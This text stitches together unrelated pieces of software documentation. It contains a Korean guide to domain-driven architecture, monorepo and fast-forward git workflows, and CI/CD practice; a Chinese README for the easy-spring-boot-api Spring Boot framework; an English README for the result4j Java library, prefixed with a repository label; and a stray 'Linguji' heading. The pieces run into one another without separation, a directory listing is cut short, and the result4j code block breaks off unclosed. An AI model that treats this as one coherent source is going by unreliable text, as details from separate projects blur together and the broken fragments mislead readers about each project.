위 그림에서 Bounded Context 1은 Bounded Context 2에 동기적으로 메시지를 전달하는 반면, Bounded Context 1과 Bounded Context 3은 Message Hub를 통해 비동기적으로 메시지를 주고받으며 협력한다.

#### 플랫폼 서비스

플랫폼 서비스는 여러 Bounded Context에 의해 재사용되는 기술 집약적 기능을 제공한다. 예를 들어 전역 범위의 유일성을 보장하는 엔터티 식별자를 생성하거나 암호화 기능을 제공할 수 있다.

#### 레거시 시스템 사용

Bounded Context는 직접 비즈니스 도메인의 해법을 제공하는 것이 원칙이지만 현실적인 이유로 인해 해법 구현을 Legacy System에 위임할 수 있다. 예를 들어 Legacy System 자체는 폐기되었지만 포함된 기능 중 일부는 유용하고 재구현 비용이 비싸다면 Bounded Context의 인터페이스 설계에는 배제하되 구현에는 활용하는 것이 실용적일 수 있다.

```mermaid
C4Context

Enterprise_Boundary(wb, ""System"") {
  System_Boundary(sb, ""Server"") {
    System_Boundary(dmb, ""Domain Model"") {
      Component(bc1, ""Bounded Context 1"")
      Component(bc2, ""Bounded Context 2"")
      Component(bc3, ""Bounded Context 3"")
      Component(bc4, ""Bounded Context 4"")
    }
  }
  System_Boundary(lb, ""Legacy Systems"") {
    Container(ls1, ""Legacy System 1"")
    Container(ls2, ""Legacy System 2"")
    Container(ls3, ""Legacy System 3"")
  }
}

Rel(bc3, ls3, ""Depends on"", ""HTTP"")
Rel(bc4, ls1, ""Depends on"", ""HTTP"")

UpdateRelStyle(bc4, ls1, $offsetY=""-100"", $offsetX=""-40"")
UpdateRelStyle(bc4, ls2, $offsetY=""-80"", $offsetX=""-40"")

UpdateLayoutConfig($c4ShapeInRow=""1"", $c4BoundaryInRow=""3"")

UpdateElementStyle(bc1, $bgColor=""lightgrey"", $borderColor=""grey"")
UpdateElementStyle(bc2, $bgColor=""lightgrey"", $borderColor=""grey"")
```

#### 외부 서비스 사용

시스템을 외부 시스템과 통합하는 방법으로 공개 API 제공할 수도 있지만 반대로 외부 시스템이 제공하는 API를 Bounded Context가 사용할 수도 있다. 이때 Bounded Context의 모델은 외부 시스템에 직접 의존하지 않으며 추상화된 인터페이스를 통해 간접 의존한다.

```mermaid
C4Context

Enterprise_Boundary(wb, ""System"") {
  System_Boundary(sb, ""Server"") {
    System_Boundary(dmb, ""Domain Model"") {
      Component(bc1, ""Bounded Context 1"")
      Component(bc2, ""Bounded Context 2"")
      Component(bc3, ""Bounded Context 3"")
      Component(bc4, ""Bounded Context 4"")
    }
  }
}
System(es3, ""External System 3"")

Rel(bc2, es3, ""Depends on"", ""HTTP"")

UpdateLayoutConfig($c4ShapeInRow=""3"", $c4BoundaryInRow=""3"")

UpdateElementStyle(bc1, $bgColor=""lightgrey"", $borderColor=""grey"")
UpdateElementStyle(bc3, $bgColor=""lightgrey"", $borderColor=""grey"")
UpdateElementStyle(bc4, $bgColor=""lightgrey"", $borderColor=""grey"")
```

### Bounded Context 구현

#### Bounded Context 구성

**기본 구성**

일반적으로 Bounded Context는 하나의 모델을 포함한다. 이 경우 Bounded Context는 주요 구성요소 Contracts, Model, Adapters를 갖는다.

```mermaid
C4Context

Container_Boundary(bc1, ""Bounded Context 1"") {
  Component(a, ""Adapters"")
  Component(m, ""Model"")
  Component(c, ""Contracts"")
}

System_Boundary(cl, ""Clients"") {
  Container(ag, ""API Gateway"")
  Component(bc2, ""Bounded Context 2"")
  Component(ft, ""Functional Test"")
}

Component(el, ""External Library"")

Rel(m, c, ""Uses"")
Rel(a, m, ""Implements"")
Rel(a, el, ""Depends on"")
Rel(ag, c, ""Depends on"")
Rel(bc2, c, ""Depends on"")
Rel(ft, c, ""Depends on"")
```

- **Contracts:** Bounded Context가 외부에 노출하는 인터페이스 계약에 사용되는 메시지와 데이터를 정의한다. Bounded Context의 직접 또는 간접 클라이언트는 오직 Contracts에 정의된 코드에만 직접 의존할 수 있다.

- **Model:** Bounded Context가 담당하는 도메인 모델이 표현된다. 문제 해법의 핵심 논리가 작성되며 전체 시스템 범위에서 가장 중요한 영역이다.

- **Adapters:** Model이 순수한 코드로 문제 해법을 구현할 수 있도록 기반 코드를 제공한다. 예를 들어 Model에 데이터 영속 장치에 대한 추상화가 정의되었다면 이 추상화의 구현체를 Adapters가 제공한다. Model이 다른 시스템에 의존할 때 의존 대상의 설계에 의해 Model이 훼손되지 않도록 [변질 방지 계층(Anti-Corruption Layer, ACL)](https://learn.microsoft.com/en-us/azure/architecture/patterns/anti-corruption-layer)이 포함될 수도 있다. 

Model과 Adapters의 역할과 관계를 이해하기 위해 주문을 조회하는 기능에 Repository 패턴이 사용된다고 생각해 보자. Model에 `OrderRepository` 인터페이스가 정의되고 `OrderQueryProcessor` 클래스가 `OrderRepository` 인터페이스에 의존해 `Order` 개체를 찾아 `OrderView` 개체로 변환해 반환하는 기능을 구현한다. Adapters는 외부 라이브러리가 제공하는 관계형 데이터베이스 드라이버를 사용해 `OrderRepository` 인터페이스를 구현한다. 이때 Model은 Adapters와 외부 라이브러리 어떤 것에도 의존하지 않기 때문에 적응력이 높아지고 테스트하기 쉬워진다.

```mermaid
classDiagram

namespace Model {
  class OrderQueryProcessor {
    + findOrder(id) OrderView?
  }
  class OrderRepository {
    <<interface>>
    + find(id) Order?
  }
}
namespace Adapters {
  class RelationalOrderRepository {
    + find(id) Order?
  }
}
namespace ExternalLibrary {
  class DatabaseDriver
}

OrderRepository <-- OrderQueryProcessor
OrderRepository <|-- RelationalOrderRepository
DatabaseDriver <-- RelationalOrderRepository
```

**CQRS(Command and Query Responsibility Segregation)**

Bounded Context의 모델에 CQRS 패턴이 적용되면 단일 모델 구성의 Model이 Command Model과 Query Model로 분리된다. Command Model은 도메인 모델의 명령 처리를, Query Model은 도메인 모델의 조회 처리를 표현한다.

```mermaid
C4Context

Container_Boundary(bc, ""Bounded Context"") {
  Component(a, ""Adapters"")
  Container_Boundary(m, ""Model"") {
    Component(cm, ""Command Model"")
    Component(qm, ""Query Model"")
  }
  Component(c, ""Contracts"")
}

Component(el, ""External Library"")

Rel(cm, c, ""Uses"")
Rel(a, cm, ""Implements"")
Rel(qm, c, ""Uses"")
Rel(a, qm, ""Implements"")
Rel(a, el, ""Depends on"")
```

#### Bounded Context 호스팅

**단일 Bounded Context 호스팅**

Bounded Context는 Microservices 패턴에서와 같이 각각 하나의 독립된 호스트 응용프로그램에서 독립적으로 구동될 수 있다. 특정 Bounded Context에 대해 독립적으로 자원을 할당하고 출시 주기를 관리하거나 다른 Bounded Context의 장애로 인한 효과를 차단해야 할 때 적합하다. 하지만 코드 수준의 격리에 비해 호스팅 환경을 격리하는 것은 많은 관리비용을 요구하기 때문에 규모가 작은 조직에서는 신중하게 접근하는 것이 좋다.

```mermaid
C4Context

Component(f, ""API Framework"")

System_Boundary(dmb, ""Domain Model"") {
  Container(a, ""API App"")
  Component(bc, ""Bounded Context"")
}

Rel(a, f, ""Depends on"")
Rel(a, bc, ""Hosts"")
```

**공유 호스트 응용프로그램**

여러 Bounded Context가 하나의 호스트 응용프로그램에서 구동될 수 있다. 공유된 호스트 응용프로그램에서 호스팅되는 Bounded Context들은 런타임, CPU, 메모리, 네트워크, 가용성 등을 공유한다.

```mermaid
C4Context

Component(f, ""API Framework"")

System_Boundary(dmb, ""Domain Model"") {
  Component(bc1, ""Bounded Context 1"")
  Component(bc2, ""Bounded Context 2"")
  Component(bc3, ""Bounded Context 3"")
  Container(a, ""API App"")
}

UpdateLayoutConfig($c4ShapeInRow=""3"")

Rel(a, f, ""Depends on"")
Rel(a, bc1, ""Hosts"")
Rel(a, bc2, ""Hosts"")
Rel(a, bc3, ""Hosts"")
```

**다중 호스트 응용프로그램**

하나의 Bounded Context가 둘 이상의 응용프로그램에서 호스팅될 수 있다. 예를 들어 하나의 Bounded Context가 API 응용프로그램에서 호스팅되어 동기적으로 요청을 처리하며 동시에 메시지 처리 응용프로그램에서 호스팅되어 비동기적으로 요청을 처리하는 아키텍처도 가능하다.

```mermaid
C4Context

Deployment_Node(an, ""API App Node"") {
  Container(a, ""API App"")
}

Component(af, ""API Framework"")

System_Boundary(dmb, ""Domain Model"") {
  Component(bc, ""Bounded Context"")
}

Deployment_Node(pn, ""Processor App Node"") {
  Container(p, ""Processor App"")
}

Component(pf, ""Processor Framework"")
ContainerQueue(mh, ""Message Hub"")	

UpdateLayoutConfig($c4ShapeInRow=""3"", $c4BoundaryInRow=""3"")

Rel(a, af, ""Depends on"")
Rel(a, bc, ""Hosts"")
Rel(p, pf, ""Depends on"")
Rel(p, bc, ""Hosts"")
Rel(p, mh, ""Subscribes"")
```
### 코드 디렉터리

시스템 아키텍처가 고려된 코드 디렉터리 구조는 아키텍처를 이해하고 관리하는 데 큰 도움이 된다. 예를 들어 쇼핑 서비스 시스템은 아키텍처를 반영해 코드 디렉터리를 아래와 같이 설계할 수 있다.

```text

  ┣ seller-frontend/
  ┃ ┗ web/
  ┗ shopper-frontend/
    ┣ android/
    ┣ ios/
    ┗ web/
```

#### `domain-model` 디렉터리

Domain Model 영역 코드를 담는다.

```text
domain-model/
┣ accounting/
┣ identity/
┣ inventory/
┣ orders/
┃ ┣ api/
┃ ┗ processor/
┗ shared-hosts/
  ┣ api/
  ┗ processor/
```

사례에서 `domain-model` 디렉터리는 정산을 담당하는 Accounting Bounded Context, 계정 관리를 담당하는 Identity Bounded Context, 상품 인벤토리를 담당하는 Inventory Bounded Context, 주문 관리를 담당하는 Order Bounded Context의 코드를 담으며 여러 Bounded Context를 호스팅하는 공유 API 호스트 응용프로그램과 공유 메시지 처리 호스트 응용프로그램이 포함된다. Accounting Bounded Context와 Identity Bounded Context, Inventory Bounded Context는 공유 호스트 응용프로그램에서 호스팅되며 Order Bounded Context는 전용 호스트 응용프로그램이 사용된다.

#### `infrastructure` 디렉터리

각 아키텍처 구성요소에 필요한 컴퓨팅 자원을 배치하는 IaC(Infrastructure as Code)를 담는다.

## 코드 스트림

소스 코드 형상의 변경 내역을 스트림으로 바라보는 모델은 여러 프로그래머가 협업할 때 필요한 관리비용을 줄여준다. 모든 팀 구성원이 코드에 담긴 지식에 쉽게 접근하고 분산된 작업 결과물을 안전하게 조립할 수 있다.

### 단일 저장소 전략

많은 개발 조직이 시스템 구성요소들을 수많은 개별 코드 저장소로 분해해 관리하며 이런 팀 중 대다수는 이것이 유일한 방법인 것으로 착각한다. 특히 서버 코드와 UI 클라이언트 코드를 하나의 저장소에 모아 두면 금새 종말이라도 찾아올 거라고들 상상한다. 하지만 그런 일은 전혀 일어나지 않는다. 잠깐만 사고실험을 해봐도 알 수 있다. 작은 조직은 코드 저장소를 하나로 통합할 때 오히려 이점이 크다. 또한 Google, Facebook 등 거대기업이 단일 저장소를 사용하는 사례도 찾기 어렵지 않다. 단일 저장소 전략은 최근에 등장한 개념이 아닌 오랫동안 사용되어 온 기법이다.

단일 저장소 전략의 장점은 다음과 같다.

1. **투명성:** 시스템의 모든 코드가 한 곳에 모여있기 때문에 비즈니스 프로세스 전체를 구현하는 코드를 누구나 빠르게 검색하고 이해할 수 있다. 개발자는 자신의 코드 수정이 야기할 여파를 예측하거나 다른 동료에 의해 작성된 의존 코드를 검사해 오류의 원인을 추적할 수 있게 된다. 예를 들어 자신의 개발 장비에서, 웹 프론트엔드 프로그래머는 서버 내부 구현을 조사할 수 있고 서버 프로그래머는 API 클라이언트의 사용 의도를 파악할 수 있다.

2. **변경 집합의 무결성:** 원자성을 갖는 코드 변경 집합에 비즈니스 가치 제공을 위한 코드 수정과 이 변경에 영향받는 코드의 대응을 함께 담을 수 있다. 개발팀은 변경 집합의 무결성을 통해 코드 스트림을 안전하게 보호할 수 있다.

3. **특정 시점의 전체 시스템 형상 확인:** 전체 시스템의 변경이 하나의 코드 스트림으로 표현되기 때문에 쉽 과거 특정 시점의 코드를 읽고 구동시켜 테스트할 수 있다.

4. **일관된 설계 개선:** 더 나은 설계 정책을 일관되게 적용하기 쉬워진다.

5. **표준화된 규칙 유지:** 권장되는 코드 작성과 코드 저장소 운영, 파이프라인 관리 등의 규칙을 시스템 전체 수준에서 표준화하고 관리할 수 있다. 이를 통해 관리비용이 절감되어 효율적으로 적정 수준의 코드 품질을 유지할 수 있다.

### Fast-Forward 스트림

Git을 사용해 형상을 관리하는 전략은 다양하며 각 전략은 각자의 특징을 갖는다. 코드 스트림인 `main` 브랜치의 코드 변경을 다른 분기의 간섭이 없는 fast-forward 스트림으로 관리하면 코드의 변화가 극도로 단순해지기 때문에 코드의 역사를 이해하기 쉬워진다. 병합 지옥에서 벗어나고 코드 충돌 가능성이 줄어든다. 코드 형상으로 구현되는 시스템의 각 구성요소는 복잡한 의존성 버전 관리 없이 최신 상태를 유지할 수 있다. 새로운 합류한 팀원은 복잡한 브랜칭 전략을 배울 필요 없이 즉시 간단한 작업을 시작하고 완료 후 릴리스할 수 있다.

만약 코드를 쓰는 팀 내 모든 엔지니어가 작고 원자적이고 검증된 코드 변경에 숙련되어 [지속 통합(Continuous Integration)](https://www.notion.so/Continuous-Integration-6da6ddf312614b33a6d36236bb2fb40c?pvs=21) 또는 [Trunk-Based Development](https://trunkbaseddevelopment.com/)를 사용하기 되면 여러가지 효과를 얻을 수 있는데 그 중 하나로 fast-forward 코드 스트림 유지가 자연스러워진다.

#### Fast-Forward 스트림 기반 협업 사례

Fast-Forward 스트림을 사용하는 팀이 협업하는 가상의 사례를 설명한다. 이런 작업은 실제로는 프로그래머가 직접 처리하기 보다 GitHub의 ['Allow rebase merging'](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/configuring-commit-rebasing-for-pull-requests)과 같은 코드 저장소 관리 도구를 이용하는 것이 일반적이다.

1. `main` 브랜치에서 `work-1` 브랜치와 `work-2` 브랜치를 분기한다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      branch work-1
      branch work-2
    ```

2. `main` 브랜치에 다른 경로에 의해 `3-M` 커밋이 추가된다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      branch work-1
      branch work-2
      checkout main
      commit id: ""3-M""
    ```

3. `work-1` 브랜치에 `4-W` 커밋과 `5-W` 커밋을 추가한다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      branch work-1
      branch work-2
      checkout main
      commit id: ""3-M""
      checkout work-1
      commit id: ""4-W""
      commit id: ""5-W""
    ```

4. `work-2` 브랜치에 `6-W` 커밋을 추가한다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      branch work-1
      branch work-2
      checkout main
      commit id: ""3-M""
      checkout work-1
      commit id: ""4-W""
      commit id: ""5-W""
      checkout work-2
      commit id: ""6-W""
    ```

5. `work-1` 브랜치를 `main` 브랜치에 리베이스한다. 기존 `4-W` 커밋과 `5-W` 커밋은 각각 `4-M` 커밋과 `5-M` 커밋으로 교체된다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      branch work-2
      checkout main
      commit id: ""3-M""
      branch work-1
      checkout work-1
      commit id: ""4-M""
      commit id: ""5-M""
      checkout work-2
      commit id: ""6-W""
    ```

6. `work-1` 브랜치를 `main` 브랜치에 fast-forward 병합한다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      branch work-2
      checkout main
      commit id: ""3-M""
      commit id: ""4-M""
      commit id: ""5-M""
      branch work-1
      checkout work-2
      commit id: ""6-W""
    ```

7. `main` 브랜치에 병합된 `work-1` 브랜치를 삭제한다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      branch work-2
      checkout main
      commit id: ""3-M""
      commit id: ""4-M""
      commit id: ""5-M""
      checkout work-2
      commit id: ""6-W""
    ```

8. `work-2` 브랜치를 `main` 브랜치에 리베이스한다. 기존 `6-W` 커밋은 `6-M` 커밋으로 교체된다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      commit id: ""3-M""
      commit id: ""4-M""
      commit id: ""5-M""
      branch work-2
      checkout work-2
      commit id: ""6-M""
    ```

9. `work-2` 브랜치를 `main` 브랜치에 fast-forward 병합한다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      commit id: ""3-M""
      commit id: ""4-M""
      commit id: ""5-M""
      commit id: ""6-M""
      branch work-2
    ```

10. `main` 브랜치에 병합된 `work-2` 브랜치를 삭제한다.

    ```mermaid
    gitGraph
      commit id: ""1-M""
      commit id: ""2-M""
      commit id: ""3-M""
      commit id: ""4-M""
      commit id: ""5-M""
      commit id: ""6-M""
    ```

### 테스트 기법

#### 단위 테스트(Unit Testing)

시스템을 구성하는 코드의 일부를 격리시켜 테스트한다. 단위 테스트는 작성 및 실행 비용이 싸고 테스트 결과가 안정적인 반면 성공적인 클라이언트 경험 설명력이 높지 않다.

#### 기능 테스트(Functional Testing)

코드를 실행 가능한 형태로 빌드하고 실행환경에 배치한 후 공개된 인터페이스를 통해 클라이언트의 시각에서 테스트한다. 실행환경은 로컬 환경, 통합 환경, 테스트 환경, 스테이징 환경, 운영 환경 등이 있다. 기능 테스트는 작성 및 실행 비용이 비싸고 다양한 요인에 의해 테스트 오류([1종 오류](https://gyuwon.github.io/blog/2018/12/19/false-positive-in-software-testing.html)나 2종 오류)가 발생할 가능성이 존재하지만 성공적인 클라이언트 경험 설명력이 높다. 기능 테스트는 자동화 되거나(automated) 수동으로(manual) 실행된다.

### 지속 통합(Continuous Integration)

지속 통합은 팀의 모든 코더가 짧은 주기로 단일 통합 지점에 안전한 코드를 추가하는 기법이다. 프로그래머는 자신의 로컬 개발 장비에서 코드를 작성하고 동작을 검증한 후 Pull Request를 통해 동료의 리뷰와 테스트를 거쳐 단일 통합 지점인 코드 스트림에 코드를 추가한다.

Martin Fowler는 [Continuous Integration Certification (martinfowler.com)](https://martinfowler.com/bliki/ContinuousIntegrationCertification.html) 에서 지속 통합 인증 기준으로 다음을 제시했다.

1. Every developer commits at least daily to the shared mainline
2. Every commit triggers an automated build and test
3. If build and test fails, it's repaired within ten minutes

### 파이프라인

작업 복사본 코드 형상이 코드 스트림에 병합되면, 즉 코드 스트림에 코드 변경이 추가되면, 변경 내용에 해당하는 조건을 가진 트리거가 파이프라인을 실행시킨다. 일반적으로 시스템의 각 구성요소는 디렉터리로 구분되기 때문에 디렉터리 경로 조건에 의해 트리거가 발동하는 경우가 많다. 각 파이프라인은 [지속 배치(Continuous Deployment)](https://www.notion.so/Continuous-Deployment-d114471c3b4e4ba68c703fbd6cd019e8?pvs=21) 또는 [지속 배달(Continuous Delivery)](https://www.notion.so/Continuous-Delivery-e05cc292b5984e83be3113840f0433a1?pvs=21) 과정을 담는다.

### 지속 배치(Continuous Deployment)

지속 배치는 단일 통합 지점의 모든 변경을 자동으로 출시한다. 변경된 코드 형상은 빌드되어 아티팩트가 생성되고 아티팩트는 단위 테스트된 후 아티팩트 저장소에 저장된다. 테스트 환경, 스테이징 환경, 운영 환경에 배치되는 코드 형상은 다시 빌드되지 않으며 아티팩트 저장소에 저장된 아티팩트가 그대로 사용된다. 스테이징 환경은 내부에서만 접근할 수 있는 운영 환경의 일부다. 스테이징 환경과 운영 환경 배치에는 [Blue-Green 배치](https://docs.aws.amazon.com/whitepapers/latest/overview-deployment-options/bluegreen-deployments.html) 또는 [카나리 배치](https://wa.aws.amazon.com/wellarchitected/2020-07-02T19-33-23/wat.concept.canary-deployment.en.html) 등의 기법이 사용될 수 있다. 자동화된 테스트 만으로 높은 안정적 작동의 신뢰를 얻을 수 있는 API 응용프로그램에 자주 사용된다.

### 지속 배달(Continuous Delivery)

지속 배달은 지속 배치와 아주 유사하다. 핵심 차이는 수동 승인 절차가 포함된다는 점이다. 지속 배달을 사용하면 단일 통합 지점의 모든 변경에 대해 배치 가능한 아티팩트가 준비되지만 이 아티팩트를 고객과의 접점에 배치할 지 여부는 개발팀의 정책에 의해 결정된다. 예를 들어 Product Owner나 QA 엔지니어가 출시를 결정할 수 있다. 자동화된 테스트 만으로는 높은 안정적 작동의 신뢰를 얻을 수 없거나 가치 전달 단위와 코드 변경 단위가 일치하지 않을 때 고객경험을 해칠 수 있는 UI 응용프로그램에 자주 사용된다. 수동 인증 절차는 테스트 환경이나 스테이징 환경, 또는 둘 다에 적용할 수 있다.

## 1.1 项目架构说明
### 1.1.1 easy-spring-boot-api跟Springboot的关系

1. 说明
    * easy-spring-boot-api是基于springboot开发的，自然强依赖于springboot
    * easy-spring-boot-api在springboot提供的能力之上，为开发者开发API接口提供了很多通用功能，比如接口安全（加签、验签、加解密、数据脱敏）、参数校验、防重复提交、缓存、锁、异常处理、请求响应格式规范和自动包装、国际化翻译、api接入应用渠道管理、接口文档等等功能，提供了默认实现，且支持自定义替换或拓展相关功能

2. 示意图

    * easy-spring-boot-api使用了springboot带来的所有便利，其在springmvc的基础上提供了额外的功能增强，如下图所示

        ![easy-spring-boot-api业务流程图](doc/imgs/业务流程图.jpg)

### 1.1.2 easy-spring-boot-api项目组件架构解析
* 架构图

    ![easy-spring-boot-api内部组件架构图](doc/imgs/内部组件架构图.jpg)

* 组件介绍

    主要分为以下几类组件

     1. API调用拦截器

        > 基于AOP切面设计的一套API请求、响应拦截处理流程。提供了在调用接口前后做一些通用的预处理，比如说参数校验、参数装饰、访问控制、日志输出、会话控制等等。目前内置的拦截器有：
        >
        > * 系统参数校验器
        > * 请求参数校验器
        > * 数字签名请求验签器、响应加签器
        > * 接口防重复提交控制器
        > * 接口用户会话控制器
        > * 接口日志打印器
        > * 接口访问控制器
        > * 请求、响应内容装饰器
        >
        > 也支持业务灵活定制通用的API调用拦截器。

     2. 参数装饰器

        > 参数装饰器机制通过遍历参数内容，逐个字段进行修饰，具体修饰规则由特定的装饰器制定。常见的使用场景有，对请求参数解密、响应参数加密、响应参数国际化、响应参数脱敏等等
        >
        > 注意：参数装饰器只能对参数内容做修饰，而无法改变参数类型。
        >
        > 目前内置的参数装饰器有：
        >
        > * 请求参数解密器
        > * 响应参数加密器
        > * 系统参数自动填充器
        > * 响应参数国际化翻译器
        >
        > 也支持业务灵活拓展参数装饰器。

     3. API响应序列化预处理器

        > 响应预处理器机制可以在接口返回内容给调用者之前进行额外的处理，此时可以更灵活的修饰返回内容，可以突破无法修改参数类型的限制，适用于对整个响应结构定制化处理的场景。
        >
        > 目前内置的响应预处理器有：
        >
        > * API响应自动包装预处理器
        > * API响应错误码和系统参数定制化转换器
        >
        > 当然，也支持业务灵活拓展。

     4. 方法查询缓存拦截器

        > 提供对查询类方法调用的结果进行缓存。

     5. API异常统一处理器

        > 接口调用过程中任何步骤出现异常，均能自动处理，并反馈信息给调用者。
        >
        > 支持对特定异常自定义处理，如果未处理，统一交由内置的默认异常处理器进行护理。

     6. 统一国际化翻译管理器

        > 接口返回内容均支持国际化翻译能力。
        >
        > 已整合了spring i18n国际化翻译能力，也支持拓展业务自定义国际化翻译器。

     7. 统一错误码管理器

        > 研发人员无需再关注业务错误码的定义和国际化翻译工作，可以做到定义简单、使用简单、易于理解、配置灵活
        >
        > * 支持自定义系统错误码、业务错误码
        > * 支持业务错误码自动生成
        > * 支持业务错误码以异常的方式抛出，系统自动处理

     8. 方法分布式锁拦截器

        > 提供注解标注方法是否需要启用分布式锁，解决接口并发问题

     9. 接口替换功能

        > 通过注解配置实现替换系统已有接口，拓展其功能，可用于一些基于标准项目的客开项目定制化开发

     10. 自动接口文档生成器

         > 已内置swagger+knif4j，只需指定API包路径即可实现接口文档的自动生成。

     11. 其他更多功能就不一一赘述，等你来发现哦。。。。。。

## 1.2 其他说明
* 如果你有遇到如下困扰时，你也许可以尝试使用easy-spring-boot-api框架 
  >
  >1. 服务器API缺乏统一标准的输入输出参数，难以统一规范开发人员的接口格式
  >
  >2. 缺乏简单、高效、统一的接口异常处理机制
  >
  >3. 绞尽脑汁思考错误码的命名、编号和处理机制
  >
  >4. 虽然使用参数校验注解校验API请求参数已经非常方便，但是又对其缺乏校验结果的统一处理而苦恼
  >
  >5. 项目服务于多个国家的用户，繁重的国际化工作也许会让你崩溃
  >
  >6. API缺乏权限控制、安全认证、数据加密、防重复提交等等，直接裸奔
  >
  >7. 还没有找到顺手的服务器缓存工具，对springcache的注解槽点满满等
  >
  >8. 时常为了写接口文档而占用太多coding time，而且接口文档还无法实时与接口变更保持同步

  > 现在你有福了，你只需要引入easy-spring-boot-api框架，并为你的SpringBoot应用添加`@EnableEasyApi`注解，即可解决上述所有的困扰！

* easy-spring-boot-api为你默默做了哪些工作呢？

    * 首先，easy-spring-boot-api是基于springboot的web应用框架，享受了springboot带来的一切便利性
    * 再者，其对开发WEB JSON API 的规范性、易用性、健壮性做了很多的业务增强

    > 2. 规范API响应参数，支持系统参数名自定义和添加额外的系统参数
    > 3. API响应信息自动补全系统参数，开发者无需再手动添加响应壳信息
    > 4. 应用内统一的国际化翻译能力，已经整合spring i18n，而且支持业务灵活拓展国际化能力
    > 5. 接口响应信息国际化，为需要国际化的字段添加`@LanguageTranslate`注解即可自动翻译内容后返回给调用者
    > 6. 统一的异常处理机制，全局拦截API调用异常并处理，处理结果经国际化处理后以标准的API响应格式返回给调用者，业务侧可以对特定异常进行灵活处理
    > 7. 简单易用的接口错误码，发现不满足API执行条件，直接抛出`BusinessException`异常即可通过统一异常处理机制得到预期的API响应。支持自定义系统错误码、业务错误码；依据业务错误码KEY值自动生成错误码数值；并可以对服务内的自动生成的业务错误码值进行范围限制，这样有助于不同业务服务间的错误码分段；
    > 8. API请求参数、响应参数的自动校验，校验结果自动处理后通过API响应反馈给调用者
    > 9. 简单方便的缓存管理器，使用Guava cache作为默认的本地缓存管理器，支持缓存管理器的灵活拓展，提供`@CacheMethodResult`和`@CacheMethodResultEvict`注解实现方法接口结果的缓存和失效
    > 10. 接口安全相关组件，验签、加解密、防重复提交等等，使用时只需要为你的API添加一个注解即可搞定
    > 11. 接口会话管理机制，提供Guava cache实现的默认本地会话管理器，支持业务灵活定制以支持分布式会话管理
    > 12. 接口文档化支持，提供了swagger接口文档自动生成，并整合了knife4j提供简单易用的实时api文档，支持在线调试和多种格式的离线导出

sviperll/result4j,main,"Result-type for Java
====================

The project provides Result-type similar to Result-type in Rust that
allows to return either successfull result or otherwise some kind of error.

In Java, the native way of reporting errors are exceptions, either checked or unchecked.
You do not need Result-type most of the time in Java-code, where
you can directly throw exceptions.
But there are situations, where more functional-style is used.
In such situations pure-functions are expected that throw no exceptions.
Handling exception in such situations can be cumbersome and require a lot of boilerplate code.
Result-type and associated helper-classes help with exception handling and
allow to write idiomatic functional code that can interact with methods that throw exceptions.

Result-type provides a way to pass error enformation as a first-class value through
the code written in functional style.
Routines are provided for interoperability of normal code that uses exception and
functional code that uses Result-type, so that exceptions can be caught and propagated as
errors in Result-type and then rethrown again later in the control-flow.

Getting Started
---------------

result4j
[is available in Maven Central](https://central.sonatype.com/artifact/com.github.sviperll/result4j).

````
        <dependency>
            <groupId>com.github.sviperll</groupId>
            <artifactId>result4j</artifactId>
            <version>1.0</version>
        </dependency>
````

Overview
--------

[API Documentation is available for reference](https://www.javadoc.io/doc/com.github.sviperll/result4j).

Result type can be either a successful result or some kind of error.

````java
Result<String, E> suc = Result.success(""Hello, World!"");
````

The above line declares successful result value.

````java
Result<String, Integer> err = Result.error(404);
````

The above line declares error-value.

````java
Result<String, Integer> result = ...;
switch (result) {
    case Result.Success<String, Integer>(String value) -> System.out.println(value);
    case Result.Error<String, Integer>(Integer code) ->
            throw new IOException(""%s: error"".formatted(code));
}
````

Pattern matching can be used to check unknown result value as shown above.

````java
Result<String, Integer> receivedResult = ...;
String value = receivedResult.throwError(code -> new IOException(""%s: error"".formatted(code)));
System.out.println(value);
````

Instead of a low-level pattern-matching,
higher level helper-methods are available in `Result`-class.
In the snippet above `throwError` is used to throw exception when `Result` contains error.

Result-type is created for interoperability between normal Java-code that throws exception and
more functional code.

````java
Catcher.ForFunctions<IOException> io =
    Catcher.of(IOException.class).forFunctions();
String concatenation =
        Stream.of(""a.txt"", ""b.txt"", ""c.txt"")
                .map(io.catching(name -> loadResource(name)))
                .collect(ResultCollectors.toSingleResult(Collectors.join()))
                .throwError(Function.identity());
````

Above code uses `Catcher` class to adapt functions that
throw exceptions to return Result-type instead.
`ResultCollectors` class contains helper-methods to collect multiple `Result`s into a single one.
You do not need `Catcher` class in normal Java-code, where you can directly throw exceptions.
But the above snippet can serve as an example of situations, where more functional-style is used.
In such situations pure-functions are expected that throw no exceptions.
Handling exception in such situations can be cumbersome and require a lot of boilerplate code.

````java
class MyMain {
    String loadResource(String name) throws IOException {
        // ...
    }

    void main(String[] args) throws IOException {
        Catcher.ForFunctions<IOException> io =
            Catcher.of(IOException.class).forFunctions();
        Function<String, Result<String, IOException>> f = io.catching(MyMain::loadResult);
        Result<String, IOException> result = f.apply(""my-resource"");
        String value = result.throwError(Function.identity());
        System.out.println(value);
    }
}
````

The example above shows the usage of the `catching` method of the `Catcher` class, that
allows to adapt exception throwing method and instead to have a method that returns `Result` with
exception representing as an error-value.

There is also an `AdaptingCatcher` class that allows to adapt or wrap exceptions.

````java
AdaptingCatcher.ForFunctions<IOException, PipelineException> io =
        Catcher.of(IOException.class).map(PipelineException::new).forFunctions();
AdaptingCatcher.ForFunctions<MLException, PipelineException> ml =
        Catcher.of(MLException.class).map(PipelineException::new).forFunctions();
List<Animal> animals1 =
        List.of(""cat.jpg"", ""dog.jpg"")
                .stream()
                .map(io.catching(Fakes::readFile))
                .map(Result.flatMapping(ml.catching(Fakes::recognizeImage)))
                .collect(ResultCollectors.toSingleResult(Collectors.toList()))
                .throwError(Function.identity());
Assertions.assertEquals(List.of(Animal.CAT, Animal.DOG), animals1);

# Linguji

_**lingua** : Italian word for ""language""._<br>
